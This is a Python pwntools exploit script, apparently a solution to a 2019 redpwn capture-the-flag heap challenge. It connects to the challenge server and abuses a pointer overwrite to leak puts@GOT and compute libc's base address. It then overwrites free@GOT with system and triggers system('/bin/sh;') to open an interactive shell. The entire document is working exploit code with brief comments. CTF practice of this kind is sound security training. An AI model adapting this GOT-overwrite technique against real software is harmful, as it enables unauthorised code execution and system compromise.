from pwn import *


# malloc
def greet(size):
	p.sendline('1')
	print p.recv()
	p.sendline(str(size))
	print p.recv()

# print allocated memory
def writ(size):
	p.sendline('2')
	print p.recv()
	p.sendline(str(size))
	p.recv()
	return p.recv()

# memcpy(spm->spmm, spm, sizeof(spm));
def yeet():
	p.sendline('3')
	print p.recv()

# write content to allocated memory
def eat(buff):
	p.sendline('4')
	print p.recv()
	p.sendline(buff)
	print p.recv()

# free
def delet():
	p.sendline('5')
	print p.recv()


# str to int 4 bytes
u = make_unpacker(32, endian='little', sign='unsigned') # 4 byte value


spm_addr 		= 		0x804b050
puts_got 		= 		0x804b028
puts_offset 	= 		0x006f140
system_offset 	=	 	0x004a940
free_got 		= 		0x804b018


#p = process('./dennis')
#gdb.attach(p)

p =remote('chall.2019.redpwn.net', 4006)

print p.recv()

# leak
greet(8)								# allocated 8 bytes memory
eat(p32(puts_got) + p32(spm_addr))		# overwrite spm pointer to point to puts@GOT
yeet()
puts = writ(4)[:4]						# print puts@GOT
print '-------'
print puts
print '-------'
# calculate offsets by libc
puts = u(puts)
libc_base = puts - puts_offset
system = libc_base + system_offset
print "puts:		" + hex(puts)
print "libc base:	" + hex(libc_base)
print "system:		" + hex(system)

# overwrite free@got
greet(8)
eat(p32(system) + p32(free_got))		# overwrite free function with system function address
yeet()
eat('/bin/sh;')							# write into buffer the system command
delet()									# call system('/bin/sh;')


print '\n-----------SHELL-----------\n'
p.interactive()